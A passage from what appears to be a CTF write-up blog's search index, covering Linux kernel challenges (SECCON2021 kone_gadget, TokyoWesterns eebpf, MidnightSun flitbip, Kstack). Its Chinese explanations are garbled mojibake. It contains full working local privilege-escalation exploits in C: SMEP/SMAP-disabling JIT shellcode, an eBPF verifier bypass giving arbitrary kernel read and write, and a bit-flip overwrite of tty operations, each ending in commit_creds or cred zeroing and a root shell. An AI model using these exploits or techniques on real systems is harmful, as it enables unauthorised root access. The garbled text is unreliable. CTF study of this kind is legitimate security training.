\"pushfq;\" \"popq %3;\" : \"=r\"(user_cs), \"=r\"(user_ss), \"=r\"(user_sp), \"=r\"(user_rflags) : : \"memory\"); puts(\"[*] status has been saved.\"); } void pop_shell() { if (!getuid()) { char *argv[] = {\"/bin/sh\", NULL}; char *envp[] = {NULL}; puts(\"[*] Root! :)\"); execve(\"/bin/sh\", argv, envp); } else { die(\"[!] spawn shell error!\\n\"); } } // jmp rax 0xffffffff8106805a int seccon(uint64_t rip) { return syscall(1337, rip); } int main() { int i; uint64_t *fake_stack, *filter; uint64_t *sc; kernbase = 0xffffffff81000000; save_status(); filter = malloc(0x313 * 8); fake_stack = mmap( (void *)0x100000000 - PAGE_SIZE, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED, -1, 0); if (fake_stack == MAP_FAILED) { die(\"[!] Failed to mmap fake_stack\"); } fake_stack = (uint64_t *)0x100000000; fake_stack[0] = prepare_kernel_cred; fake_stack[1] = commit_creds; fake_stack[2] = swapgs_restore_regs_and_return_to_usermode; fake_stack[3] = 0; // dummy rax fake_stack[4] = 0; // dummy rdi fake_stack[5] = (uint64_t)pop_shell; // user rip fake_stack[6] = user_cs; // user cs fake_stack[7] = user_rflags; // user rflags fake_stack[8] = user_sp; // user sp fake_stack[9] = user_ss; // user ss for (i = 0; i \u003c 0x313; i++) { filter[i] = (uint64_t)(0x01eb9090) \u003c\u003c 32; } printf(\"[+] pop_shell %p\\n\", \u0026pop_shell); printf(\"[+] user_cs 0x%lx\\n\", user_cs); printf(\"[+] user_rflags 0x%lx\\n\", user_rflags); printf(\"[+] user_sp 0x%lx\\n\", user_sp); printf(\"[+] user_ss 0x%lx\\n\", user_ss); filter[0x312] = 0x7fff000000000006; sc = \u0026filter[0x100]; i = 0; // overwrite cr4, disable smap\u0026smep sc[i++] = (uint64_t)(0x04E7200F) \u003c\u003c 32; // mov rdi, cr4; add al, 0 sc[i++] = (uint64_t)(0x01ebd231) \u003c\u003c 32; // xor edx, edx sc[i++] = (uint64_t)(0x01ebc2ff) \u003c\u003c 32; // inc edx sc[i++] = (uint64_t)(0x01ebe2d1) \u003c\u003c 32; // shl edx, 1 sc[i++] = (uint64_t)(0x01ebc2ff) \u003c\u003c 32; // inc edx sc[i++] = (uint64_t)(0x0414E2C1) \u003c\u003c 32; // shl edx, 20; add al, 0 sc[i++] = (uint64_t)(0x01ebd2f7) \u003c\u003c 32; // not edx sc[i++] = (uint64_t)(0x04D72148) \u003c\u003c 32; // and rdi, rdx; add al, 0 sc[i++] = (uint64_t)(0x04E7220F) \u003c\u003c 32; // mov cr4, rdi; add al, 0 // rsp = 0x100000000 sc[i++] = (uint64_t)(0x01ebe431) \u003c\u003c 32; // xor esp, esp sc[i++] = (uint64_t)(0x01ebccff) \u003c\u003c 32; // dec esp sc[i++] = (uint64_t)(0x04c4ff48) \u003c\u003c 32; // inc rsp; add al, 0 // call prepare_kernel_cred sc[i++] = (uint64_t)(0x01ebff31) \u003c\u003c 32; // xor edi, edi sc[i++] = (uint64_t)(0x01eb9058) \u003c\u003c 32; // pop rax; nop sc[i++] = (uint64_t)(0x01ebd0ff) \u003c\u003c 32; // call rax; // call commit_creds sc[i++] = (uint64_t)(0x04c78948) \u003c\u003c 32; // mov rdi, rax; add al, 0 sc[i++] = (uint64_t)(0x01eb9058) \u003c\u003c 32; // pop rax; nop sc[i++] = (uint64_t)(0x01ebd0ff) \u003c\u003c 32; // call rax; // call swapgs_restore_regs_and_return_to_usermode + 22 sc[i++] = (uint64_t)(0x01eb9058) \u003c\u003c 32; // pop rax; nop // ! `call rax` will destroy stack frame !! sc[i++] = (uint64_t)(0x01ebe0ff) \u003c\u003c 32; // jmp ra","date":"2022-01-21","objectID":"/seccon2021-kone-gadget/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"SECCON2021-kone_gadget","uri":"/seccon2021-kone-gadget/#the-full-exp"},{"categories":["Writeups"],"content":"eebpfä¸€é“æ¥è‡ªTokyowesterns CTF 2020çš„å†…æ ¸é¢˜ç›®ã€‚åœ¨åšé¢˜ä¹‹å‰ï¼Œéœ€è¦å­¦ä¹ ebpfçš„ç›¸å…³çŸ¥è¯†ã€‚è¿™é‡Œæœ‰ä¸€ç¯‡æˆ‘çš„ç¬”è®°ã€‚ ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#eebpf"},{"categories":["Writeups"],"content":"Bugé¢˜ç›®patchäº†ä¸€ä¸ªæ–°çš„æŒ‡ä»¤ åŸå§‹å·¦ç§»: struct tnum tnum_lshift(struct tnum a, u8 shift) { return TNUM(a.value \u003c\u003c shift, a.mask \u003c\u003c shift); } case BPF_LSH: if (umax_val \u003e= insn_bitness) { /* Shifts greater than 31 or 63 are undefined. * This includes shifts by a negative number. */ mark_reg_unknown(env, regs, insn-\u003edst_reg); break; } /* We lose all sign bit information (except what we can pick * up from var_off) */ dst_reg-\u003esmin_value = S64_MIN; dst_reg-\u003esmax_value = S64_MAX; /* If we might shift our top bit out, then we know nothing */ if (dst_reg-\u003eumax_value \u003e 1ULL \u003c\u003c (63 - umax_val)) { dst_reg-\u003eumin_value = 0; dst_reg-\u003eumax_value = U64_MAX; } else { dst_reg-\u003eumin_value \u003c\u003c= umin_val; dst_reg-\u003eumax_value \u003c\u003c= umax_val; } dst_reg-\u003evar_off = tnum_lshift(dst_reg-\u003evar_off, umin_val); /* We may learn something more from the var_off */ __update_reg_bounds(dst_reg); break; Patch: struct tnum tnum_alshift(struct tnum a, u8 min_shift, u8 insn_bitness) { if (insn_bitness == 32) //Never reach here now. return TNUM((u32)(((s32)a.value) \u003c\u003c min_shift), (u32)(((s32)a.mask) \u003c\u003c min_shift)); else return TNUM((s64)a.value \u003c\u003c min_shift, (s64)a.mask \u003c\u003c min_shift); } case BPF_ALSH: if (umax_val \u003e= insn_bitness) { /* Shifts greater than 31 or 63 are undefined. * This includes shifts by a negative number. */ mark_reg_unknown(env, regs, insn-\u003edst_reg); break; } /* Upon reaching here, src_known is true and * umax_val is equal to umin_val. */ if (insn_bitness == 32) { //Now we don't support 32bit. Cuz im too lazy. mark_reg_unknown(env, regs, insn-\u003edst_reg); break; } else { dst_reg-\u003esmin_value \u003c\u003c= umin_val; dst_reg-\u003esmax_value \u003c\u003c= umin_val; } dst_reg-\u003evar_off = tnum_alshift(dst_reg-\u003evar_off, umin_val, insn_bitness); /* blow away the dst_reg umin_value/umax_value and rely on * dst_reg var_off to refine the result. */ dst_reg-\u003eumin_value = 0; dst_reg-\u003eumax_value = U64_MAX; __update_reg_bounds(dst_reg); break; Update; /* Attempts to improve min/max values based on var_off information */ static void __update_reg_bounds(struct bpf_reg_state *reg) { /* min signed is max(sign bit) | min(other bits) */ reg-\u003esmin_value = max_t(s64, reg-\u003esmin_value, reg-\u003evar_off.value | (reg-\u003evar_off.mask \u0026 S64_MIN)); /* max signed is min(sign bit) | max(other bits) */ reg-\u003esmax_value = min_t(s64, reg-\u003esmax_value, reg-\u003evar_off.value | (reg-\u003evar_off.mask \u0026 S64_MAX)); reg-\u003eumin_value = max(reg-\u003eumin_value, reg-\u003evar_off.value); reg-\u003eumax_value = min(reg-\u003eumax_value, reg-\u003evar_off.value | reg-\u003evar_off.mask); } struct bpf_array { struct bpf_map map; u32 elem_size; u32 index_mask; /* 'ownership' of prog_array is claimed by the first program that * is going to use this map or by the first program which FD is stored * in the map to make sure that all callers and callees have the same * prog_type and JITed flag */ enum bpf_prog_type owner_prog_type; bool owner_jited; union { char value[0] __aligned(8); void *ptrs[0] __aligned(8); void __percpu *pptrs[0] __aligned(8); }; }; ä¸¢å¤± sign bitå¯èƒ½å¯¼è‡´ smax_value \u003c smin_value ã€‚è®©æˆ‘ä»¬è¯•éªŒä»¥ä¸‹æƒ…å†µï¼š r1 = array[0](= 0) /* verfier r1-\u003esmin = 0 r1-\u003esmax = 2^62 */ r2 = array[1](= 1) /* verfier r1-\u003esmin = 0 r1-\u003esmax = 2^62 */ r1 \u0026= 1 /* verfier r1-\u003esmin = 0 r1-\u003esmax = 1 */ r2 \u0026= 1 /* verfier r2-\u003esmin = 0 r2-\u003esmax = 1 */ ALSH(r1, 63) /* verfier r1-\u003esmin = 0 r1-\u003esmax = 0x8000000000000000 */ ARSH(r1, 63) /* verfier r1-\u003esmin = 0 r1-\u003esmax = -1 */ r3 = r1 + r2 /* verfier r3-\u003esmin = 0 r3-\u003esmax = 0 */ // ! but r1 + r2 == 1 !! è¿™æ ·ç»•è¿‡äº†verfierçš„æ£€æŸ¥ï¼Œä½¿æˆ‘ä»¬å¯ä»¥è¶Šç•Œè®¿é—®æ•°æ®ã€‚ ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:1:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#bug"},{"categories":["Writeups"],"content":"leaké¦–å…ˆï¼Œæ³„æ¼å†…æ ¸åœ°å€ã€‚æˆ‘ä»¬å¯ä»¥è¶Šç•Œè¯»å–ï¼Œbpf_map-\u003emap_opså¾—åˆ°å†…æ ¸åœ°å€ã€‚ struct bpf_insn prog[] = { BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0), BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0] BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1), // key = [r2] = 1; BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // r7 = array[0] BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 3), // r6 \u0026= 1 (0, 1) BPF_ALU64_IMM(BPF_ALSH, BPF_REG_6, 63), // r6 \u003c\u003c= 63 BPF_ALU64_IMM(BPF_ARSH, BPF_REG_6, 63), // r6 \u003e\u003e= 63 (0, -1) BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1), // r7 \u0026= 1 (0, 1) BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7), // r6 += r7 (0, 0) BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, 0x300), // r6 =0 (0x300) BPF_LD_MAP_FD(BPF_REG_1, read_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), BPF_MOV64_REG(BPF_REG_8, BPF_REG_0), // r8 = \u0026array[0] BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 0x600), BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6), BPF_ALU64_REG(BPF_SUB, BPF_REG_8, BPF_REG_6), BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, 0xd0), BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0), // write address in array[0] BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_3, 0), BPF_MOV64_IMM(BPF_REG_0, 0), BPF_EXIT_INSN() }; ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:2:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#leak"},{"categories":["Writeups"],"content":"AARå¾—åˆ°kernbaseåï¼Œé€šè¿‡bpf_map_get_info_by_idï¼Œå¦‚æœmap-\u003ebtfä¸ä¸ºç©ºï¼Œåˆ™å¯ä»¥è¯»å–btf+0x58åœ°å€çš„å››å­—èŠ‚æ•°æ®ã€‚é€šè¿‡ä¿®æ”¹btfæŒ‡é’ˆï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€è¯»ã€‚ if (map-\u003ebtf) { info.btf_id = btf_id(map-\u003ebtf); info.btf_key_type_id = map-\u003ebtf_key_type_id; info.btf_value_type_id = map-\u003ebtf_value_type_id; } [...] if (copy_to_user(uinfo, \u0026info, info_len) || put_user(info_len, \u0026uattr-\u003einfo.info_len)) return -EFAULT; ä¸ºäº†ç»•è¿‡verfierçš„æ£€æŸ¥ï¼Œæˆ‘ä»¬æŠŠç›®æ ‡åœ°å€æå‰å†™åˆ°mapä¸­ï¼Œç„¶ååœ¨ç¨‹åºä¸­è¯»å–å³å¯ã€‚ é€šè¿‡è°ƒè¯•ï¼Œå¯ä»¥æ‰¾åˆ°init_taskçš„åœ°å€ï¼Œç„¶åéå†å…¶è¿›ç¨‹é“¾è¡¨ï¼Œæ‰¾åˆ°å½“å‰ç¨‹åºçš„task_structå°±èƒ½å¾—åˆ°å½“å‰ç¨‹åºçš„credã€‚ ç”±äºè¿™äº›ç»“æ„ä¸­æœ‰å¾ˆå¤šå†…æ ¸ç¼–è¯‘é€‰é¡¹æ§åˆ¶çš„å­—æ®µï¼Œæ‰€ä»¥å…·ä½“çš„åç§»è¿˜è¦é€šè¿‡è°ƒè¯•æ‰èƒ½å¾—åˆ°ã€‚ ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:3:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#aar"},{"categories":["Writeups"],"content":"AAWä¸‹é¢æˆ‘ä»¬éœ€è¦å¯¹credè¿›è¡Œè¦†ç›–ï¼Œå¯»æ‰¾åˆé€‚çš„åˆ©ç”¨è¿›è¡Œä»»æ„åœ°å€å†™ã€‚ static int array_map_get_next_key(struct bpf_map *map, void *key, void *next_key) { struct bpf_array *array = container_of(map, struct bpf_array, map); u32 index = key ? *(u32 *)key : U32_MAX; u32 *next = (u32 *)next_key; if (index \u003e= array-\u003emap.max_entries) { *next = 0; return 0; } if (index == array-\u003emap.max_entries - 1) return -ENOENT; *next = index + 1; return 0; } ä¸Šé¢çš„å‡½æ•°keyå’Œnext_keyç”±æˆ‘ä»¬æ§åˆ¶ï¼Œå¯ä»¥å°†ä»»æ„åœ°å€å†™å…¥0æˆ–index+1ã€‚ä¸‹é¢çš„å‡½æ•°çš„å‚æ•°ä¸è¿™ä¸ªå‡½æ•°å‡ ä¹ç›¸åŒï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è®¾ç½®ã€‚ int bpf_map_push_elem(struct bpf_map *map, const void *value, u64 flags) åœ¨flagså¡«å…¥ç›®æ ‡åœ°å€ï¼Œvalueå¡«å…¥ç›®æ ‡å€¼ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®array-\u003emap.max_entriesä¸º0xffffffffï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç›®çš„åœ°å€å€¼ä¸º0ï¼ŒåŒæ—¶æ‰©å¤§äº†æˆ‘ä»¬å¯ä»¥å†™çš„å€¼çš„èŒƒå›´ã€‚ä½†æ˜¯è¿™ä¸ªå‡½æ•°åªæœ‰åœ¨mapç±»å‹ä¸ºBPF_MAP_TYPE_STACK or BPF_MAP_TYPE_QUEUEæ‰ä¼šè¢«è°ƒç”¨ï¼Œæ‰€ä»¥è¿˜è¦ä¿®æ”¹mapçš„ç±»å‹ã€‚ åŠ«æŒmap-\u003emap_opsåˆ°æå‰æ„é€ çš„è™šè¡¨ ä¿®æ”¹map-\u003etypeä¸ºBPF_MAP_TYPE_STACK ä¿®æ”¹map-\u003emax_entriesä¸º0xffffffff ä¿®æ”¹map-\u003espin_lock_offä¸º0ï¼Œä»¥ç»•è¿‡å…¶ä»–çš„æ£€æŸ¥ åœ¨ä¼ªé€ çš„è™šè¡¨ä¸­ï¼Œbpf_map_push_elemæŒ‡é’ˆéœ€è¦è¢«æ›¿æ¢ä¸ºarray_map_get_next_key ","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:4:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#aaw"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003clinux/bpf_common.h\u003e#include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e#include \"bpf_insn.h\" #define PAGE_SIZE 4096 #define BPF_ALSH 0xe0 #define HELLO_MSG \"I am Niebelungen, let me in!\" #define MSG_LEN 28 void die(const char *msg) { perror(msg); exit(-1); } int global_fd; uint64_t kernbase; int read_map, write_map; int control_map; int reader_fd, reader_sock; int writer_fd, writer_sock; int _bpf(int cmd, union bpf_attr *attr, uint32_t size) { return syscall(__NR_bpf, cmd, attr, size); } int create_map(int value_size, int cnt) { int map_fd; union bpf_attr attr = {.map_type = BPF_MAP_TYPE_ARRAY, .key_size = 4, .value_size = value_size, .max_entries = cnt}; map_fd = _bpf(BPF_MAP_CREATE, \u0026attr, sizeof(attr)); if (map_fd \u003c 0) { die(\"[!] Error creating map\"); } printf(\"[+] created map: %d\\n\\tvalue size: %d\\n\\tcnt: %d\\n\", map_fd, value_size, cnt); return map_fd; } int prog_load(struct bpf_insn *prog, int insn_cnt) { int prog_fd; char log_buf[0xf000]; union bpf_attr attr = { .prog_type = BPF_PROG_TYPE_SOCKET_FILTER, .insn_cnt = insn_cnt, .insns = (uint64_t)prog, .license = (uint64_t) \"GPL\", .log_level = 2, .log_size = sizeof(log_buf), .log_buf = (uint64_t)log_buf, }; prog_fd = _bpf(BPF_PROG_LOAD, \u0026attr, sizeof(attr)); // printf(\"[+] log_buf: %s\\nLOG_END\\n\", log_buf); if (prog_fd \u003c 0) { die(\"[!] Failed to load BPF prog!\"); } return prog_fd; } int update_item(int fd, int idx, uint64_t value) { union bpf_attr attr = { .map_fd = fd, .key = (uint64_t)\u0026idx, .value = (uint64_t)\u0026value, .flags = BPF_ANY, }; // printf(\"[+] update_item;\\n\\tmap_fd: %d\\n\\tidx: 0x%x\\n\\tvalue: 0x%lx\\n\", fd, // idx, value); return _bpf(BPF_MAP_UPDATE_ELEM, \u0026attr, sizeof(attr)); } uint64_t get_item(int fd, uint64_t idx) { char value[0x800]; uint64_t index = idx; union bpf_attr *attr = calloc(1, sizeof(union bpf_attr)); attr-\u003emap_fd = fd; attr-\u003ekey = (uint64_t)\u0026idx; attr-\u003evalue = (uint64_t)value; if (_bpf(BPF_MAP_LOOKUP_ELEM, attr, sizeof(*attr)) \u003c 0) { die(\"[!] Failed to lookup\"); } return *(uint64_t *)value; } uint32_t READ32(uint64_t target) { update_item(control_map, 0, 0); update_item(control_map, 1, 1); update_item(control_map, 2, target - 0x58); if (send(reader_sock, HELLO_MSG, MSG_LEN, 0) \u003c 0) { die(\"[!] Failed to send HELLO_MSG\"); } struct bpf_map_info *info = calloc(1, sizeof(struct bpf_map_info)); union bpf_attr push_attr = { .info.bpf_fd = read_map, .info.info_len = sizeof(*info), .info.info = (uint64_t)info, }; if (_bpf(BPF_OBJ_GET_INFO_BY_FD, \u0026push_attr, sizeof(push_attr)) \u003c 0) { die(\"[!] Failed to get push\"); } return info-\u003ebtf_id; } uint64_t READ64(uint64_t target) { uint64_t low = READ32(target); uint64_t high = READ32(target + 4); return low + (high \u003c\u003c 32); } uint64_t leak_kernel() { int leak_fd; struct bpf_insn prog[] = { BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8), // r2 = fp -8 BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0), // key = [r2] = 0; BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0), BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), // r0 = lookup_elem BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1), // jmp if(r0!=NULL) BPF_EXIT_INSN(), // else exit BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0), // r6 = array[0] BPF_LD_MAP_FD(BPF_REG_1, control_map), // r1 = map_fd BPF_MOV64_IMM(BPF_REG_0, 0), // r0 = 0 BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), // r2 = rbp BPF_ALU64_IMM(BPF_AD","date":"2022-01-17","objectID":"/eebpf-tokyowesterns-ctf-2020/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"eebpf-Tokyowesterns CTF 2020","uri":"/eebpf-tokyowesterns-ctf-2020/#the-full-exp"},{"categories":["Writeups"],"content":"filpbitæºç æä¾›ï¼š #include \u003clinux/kernel.h\u003e#include \u003clinux/init.h\u003e#include \u003clinux/sched.h\u003e#include \u003clinux/syscalls.h\u003e #define MAXFLIT 1 #ifndef __NR_FLITBIP #define FLITBIP 333 #endif long flit_count = 0; EXPORT_SYMBOL(flit_count); SYSCALL_DEFINE2(flitbip, long *, addr, long, bit) { if (flit_count \u003e= MAXFLIT) { printk(KERN_INFO \"flitbip: sorry :/\\n\"); return -EPERM; } *addr ^= (1ULL \u003c\u003c (bit)); flit_count++; return 0; } å‡ ä¹æ²¡æœ‰å¼€å¯ä»»ä½•çš„ä¿æŠ¤ï¼Œé€šè¿‡è‡ªå®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨ä¿®æ”¹æŒ‡å®šçš„å†…å­˜çš„æ•°æ®ã€‚ é¢˜ç›®é€»è¾‘æ˜¯å¸Œæœ›åªèƒ½å®ç°ä¸€æ¬¡ï¼Œè€Œflit_countæ•°æ®ç±»å‹æ˜¯longï¼Œå¦‚æœå°†å…¶æœ€é«˜ä½ç¿»è½¬ï¼Œåˆ™å¯ä»¥è¾¾åˆ°ä¿®æ”¹ä»»æ„æ¬¡ã€‚ é€šè¿‡ä¿®æ”¹n_tty_opsçš„å‡½æ•°æŒ‡é’ˆæ§åˆ¶ripï¼Œæ§åˆ¶æ‰§è¡Œæµåéœ€è¦ä¿®æ”¹å½“å‰è¿›ç¨‹çš„credã€‚é€šè¿‡è¯»å–current_taskå¾—åˆ°PCBï¼Œè¿›è€Œå¾—åˆ°credã€‚ ","date":"2022-01-17","objectID":"/midnightsun2018-filpbit/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"MidnightSun2018-filpbit","uri":"/midnightsun2018-filpbit/#filpbit"},{"categories":["Writeups"],"content":"The full exp #define _GNU_SOURCE #include \u003cassert.h\u003e#include \u003cerr.h\u003e#include \u003cerrno.h\u003e#include \u003cfcntl.h\u003e#include \u003clinux/bpf.h\u003e#include \u003clinux/filter.h\u003e#include \u003clinux/userfaultfd.h\u003e#include \u003cmalloc.h\u003e#include \u003cnetinet/in.h\u003e#include \u003cpoll.h\u003e#include \u003cpthread.h\u003e#include \u003csched.h\u003e#include \u003csignal.h\u003e#include \u003cstdint.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003csys/ioctl.h\u003e#include \u003csys/ipc.h\u003e#include \u003csys/mman.h\u003e#include \u003csys/msg.h\u003e#include \u003csys/prctl.h\u003e#include \u003csys/shm.h\u003e#include \u003csys/socket.h\u003e#include \u003csys/syscall.h\u003e#include \u003csys/types.h\u003e#include \u003csys/uio.h\u003e#include \u003csys/xattr.h\u003e#include \u003cunistd.h\u003e uint64_t *flit_count = (uint64_t *)0xffffffff818f4f78; uint64_t *n_tty_read = (uint64_t *)0xffffffff810c8510; uint64_t *n_tty_ops = (uint64_t *)0xffffffff8183e320; uint64_t *n_tty_ops_read = (uint64_t *)(0xffffffff8183e320 + 0x30); uint64_t *current_task = (uint64_t *)0xffffffff8182e040; void die(const char *msg) { fprintf(stderr, msg, strlen(msg), 0); exit(-1); } uint64_t user_cs, user_ss, user_rflags, user_sp; void save_status() { __asm__(\"mov %0, cs;\" \"mov %1, ss;\" \"mov %2, rsp;\" \"pushfq;\" \"popq %3;\" : \"=r\"(user_cs), \"=r\"(user_ss), \"=r\"(user_sp), \"=r\"(user_rflags) : : \"memory\"); puts(\"[*] status has been saved.\"); } void pop_shell() { if (!getuid()) { char *argv[] = {\"/bin/sh\", NULL}; char *envp[] = {NULL}; execve(\"/bin/sh\", argv, envp); puts(\"[*] Root!\"); } else { die(\"[!] spawn shell error!\\n\"); } } int __flit(void *addr, uint64_t bit) { __asm__(\"mov rax, 333;\" \"syscall;\"); } int flitbip(void *addr, uint64_t bit) { int ret = __flit(addr, bit); if (ret \u003c 0) { die(\"[!] flit failed\\n\"); } return ret; } void root() { uint64_t *cred = (uint64_t *)*(uint64_t *)((char *)*current_task + 0x3c0); memset(cred, 0, 28); *(uint64_t *)n_tty_ops_read = (uint64_t)n_tty_read; __asm__(\"swapgs;\" \"mov rax, %0;\" \"push rax;\" \"mov rax, %1;\" \"push rax;\" \"mov rax, %2;\" \"push rax;\" \"mov rax, %3;\" \"push rax;\" \"mov rax, %4;\" \"push rax;\" \"iretq;\" : : \"r\"(user_ss), \"r\"(user_sp), \"r\"(user_rflags), \"r\"(user_cs), \"r\"(pop_shell) : \"memory\"); } int main() { save_status(); flitbip(flit_count, 63); uint64_t flipper = (uint64_t)root ^ (uint64_t)n_tty_read; for (int i = 0; i \u003c 64; i++) { if ((flipper \u0026 1) == 1) flitbip(n_tty_ops_read, i); flipper \u003e\u003e= 1; } char buf; scanf(\"%c\", \u0026buf); return 0; } ","date":"2022-01-17","objectID":"/midnightsun2018-filpbit/:0:0","series":null,"tags":["Writeups","Kernel"],"title":"MidnightSun2018-filpbit","uri":"/midnightsun2018-filpbit/#the-full-exp"},{"categories":["Writeups"],"content":"Kstackè¿™ä¸ªé¢˜ç›®åŒæ ·æä¾›äº†æºç ã€‚ typedef struct _Element { int owner; unsigned long value; struct _Element *fd; } Element; Element *head = NULL; static long proc_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { Element *tmp, *prev; int pid = task_tgid_nr(current); switch (cmd) { case CMD_PUSH: tmp = kmalloc(sizeof(Element), GFP_KERNEL); tmp-\u003eowner = pid; tmp-\u003efd = head; head = tmp; if (copy_from_user((void *)\u0026tmp-\u003evalue, (void *)arg, sizeof(unsigned long))) { head = tmp-\u003efd; kfree(tmp); return -EINVAL; } break; case CMD_POP: for (tmp = head, prev = NULL; tmp != NULL; prev = tmp, tmp = tmp-\u003efd) { if (tmp-\u003eowner == pid) { if (copy_to_user((void *)arg, (void *)\u0026tmp-\u003evalue, sizeof(unsigned long))) return -EINVAL; if (prev) { prev-\u003efd = tmp-\u003efd; } else { head = tmp-\u003efd; } kfree(tmp); break; } if (tmp-\u003efd == NULL) return -EINVAL; } break; } return 0; } å®ƒå®ç°äº†ä¸€ä¸ªé“¾æ ˆï¼Œheadæ˜¯æ ˆé¡¶ã€‚æ¯ä¸ªæ ˆå¸§éƒ½ä¸è¯·æ±‚è¿›ç¨‹çš„pidç»‘å®šã€‚å¾ˆæ˜æ˜¾çš„æ¼æ´æ˜¯ï¼Œheadæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå¯¹å…¶çš„ä»»ä½•æ“ä½œéƒ½æ²¡æœ‰åŠ é”ã€‚ 